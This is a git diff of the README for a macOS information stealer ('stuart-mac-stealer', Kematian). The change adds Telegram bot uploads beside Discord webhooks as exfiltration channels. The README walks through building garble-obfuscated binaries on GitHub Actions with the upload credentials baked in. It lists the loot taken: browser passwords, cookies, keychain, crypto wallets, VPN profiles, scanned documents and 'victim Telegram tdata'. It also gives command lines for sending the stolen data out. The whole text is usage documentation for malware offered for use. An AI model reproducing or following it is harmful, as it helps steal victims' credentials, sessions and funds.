@@ -8,15 +8,17 @@ Overlord uses the separate **Kematian Overlord plugin** on Windows/Linux. This r
 
 ## Build on GitHub Actions (recommended)
 
-1. Repo **Settings → Secrets and variables → Actions** → add secret:
-   - `DISCORD_WEBHOOK` = `https://discord.com/api/webhooks/ID/TOKEN`
+1. Repo **Settings → Secrets and variables → Actions** → add secrets (at least one upload method):
+   - `DISCORD_WEBHOOK` = `https://discord.com/api/webhooks/ID/TOKEN` (optional)
+   - `TELEGRAM_BOT_TOKEN` = token from [@BotFather](https://t.me/BotFather) (optional)
+   - `TELEGRAM_CHAT_ID` = your user ID, group ID, or channel ID (optional)
 2. **Actions → macOS Build (CGO) → Run workflow**
-   - **Obfuscate with garble** — on by default (same idea as Overlord agent)
-   - **Garble -literals** — on by default (obfuscates embedded webhook string)
-   - Optional: paste a different webhook in **discord_webhook** (overrides the secret)
-3. Download artifact **stuart-mac-stealer-macos** (`kematian-darwin-arm64`, `kematian-darwin-amd64`, zip)
+   - Paste **telegram_bot_token** and **telegram_chat_id** (or rely on secrets)
+   - **discord_webhook** is optional if Telegram is configured
+   - **Obfuscate with garble** — on by default
+3. Download artifact **stuart-mac-stealer-macos**
 
-The webhook is **baked into the binary** at build time (`main.defaultWebhook`). You do not need to pass it at runtime unless you want to override with `-webhook`.
+Credentials are **baked into the binary** at build time. Override at runtime with flags/env if needed.
 
 Pushes to `main` and version tags `v*` also run this workflow (garble + `-literals` enabled, uses `DISCORD_WEBHOOK` secret).
 
@@ -82,12 +84,38 @@ Webhook uploads are split into **≤8MB** zip parts. Discord returns `HTTP 413 R
 - **VPN:** NordVPN, WireGuard, OpenVPN, Mullvad, Tunnelblick profiles
 - **Password candidates:** browser + keychain + mutations + app/VPN passwords (`password_candidates.json`)
 
-## Discord payload
+## Upload destinations
 
-- Embed with harvest counts (passwords, cookies, history, wallets, etc.)
-- Zip attachment: `harvest.json`, `summary.txt`, `cookies.txt` (Netscape format when present)
+Configure **Discord**, **Telegram**, or **both** at build time.
 
-Max upload size is capped under Discord’s 25MB webhook limit.
+### Telegram Bot (recommended for large loot)
+
+- Up to **~45MB per zip** (vs ~8MB practical Discord limit)
+- Sends harvest zips, scanned files, and **victim Telegram `tdata`** archives
+- Get chat ID: message [@userinfobot](https://t.me/userinfobot) or add bot to a channel and use channel ID (often `-100…`)
+
+```bash
+# Build-time via GitHub Actions inputs or secrets TELEGRAM_BOT_TOKEN + TELEGRAM_CHAT_ID
+./kematian-darwin-arm64
+
+# Runtime override
+./kematian-darwin-arm64 -telegram-token 'BOT:TOKEN' -telegram-chat '-1001234567890'
+```
+
+### Discord webhook (optional)
+
+- Summary embed + zip parts (8MB chunks when Discord is enabled)
+- Use together with Telegram to get mobile Discord notifications + large Telegram files
+
+```bash
+./kematian-darwin-arm64 -webhook 'https://discord.com/api/webhooks/...'
+```
+
+### Upload phases
+
+1. **Primary harvest** — logs, passwords, wallets, `password_candidates.json`
+2. **Scanned files** — PDF, TXT, images
+3. **Victim Telegram tdata** — `*-telegram-Main.zip` per session (if Telegram Desktop installed)
 
 ## Source
 
